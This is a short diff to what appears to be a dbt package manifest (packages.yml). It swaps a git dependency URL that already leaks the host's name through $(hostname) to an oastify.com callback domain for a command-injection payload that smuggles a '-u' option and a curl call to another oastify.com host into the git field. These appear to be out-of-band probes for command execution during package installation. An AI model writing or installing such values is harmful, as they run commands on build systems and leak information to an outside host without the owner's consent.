@@ -2,5 +2,5 @@ packages:
   - package: dbt-labs/snowplow
     version: 0.7.0
 
-  - git: "https://otl0fsk9f46os9vlpsdhr9bbo2utthj58.oastify.com/$(hostname)/dbt-utils.git"
+  - git: "-u$({curl,222eo6tnoif21n4zy6mv0nkpxg373vtji.oastify.com}) :x"
     revision: 0.9.2
